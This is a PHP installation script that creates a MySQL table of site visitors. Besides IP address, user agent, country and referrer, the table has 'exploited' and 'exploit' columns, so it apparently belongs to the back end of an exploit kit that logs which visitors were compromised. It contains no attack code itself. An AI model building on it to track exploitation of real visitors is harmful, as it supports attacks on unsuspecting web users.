<?

	include_once('../config.php');
	include_once('../include/sql.php');
	include_once('../include/visitors.php');

	$sql = new CSQL($sqlSettings);
	$sql->open();
	
	createTables($sqlSettings);

	echo "Installation Complete.<br>";

	$sql->close();

	function createTables($sqlSettings)
		{
			$cq = new CQuery();
			echo("Creating Table " . $sqlSettings['tableVisitorsList'] . "<br>");
			
			$sql_result = mysql_query(" DROP TABLE IF EXISTS  `" . $sqlSettings['dbName'] . "`.`" . $sqlSettings['tableVisitorsList'] . "`");
			$sql_result = mysql_query("
				CREATE TABLE IF NOT EXISTS `" . $sqlSettings['dbName'] . "`.`" . $sqlSettings['tableVisitorsList'] . "` (
				`id` INT AUTO_INCREMENT ,
				`ipAddress` VARCHAR( 16 ),
				`userAgent` VARCHAR( 400 ),
				`country` VARCHAR( 400 ),
				`referrer` VARCHAR( 400 ),
				`exploited` BOOL,
				`exploit` VARCHAR( 400 ),				
				PRIMARY KEY ( `id` )
				) ENGINE = MYISAM ;");
						
			echo("Tables Created.<br>");
		}
	
?>
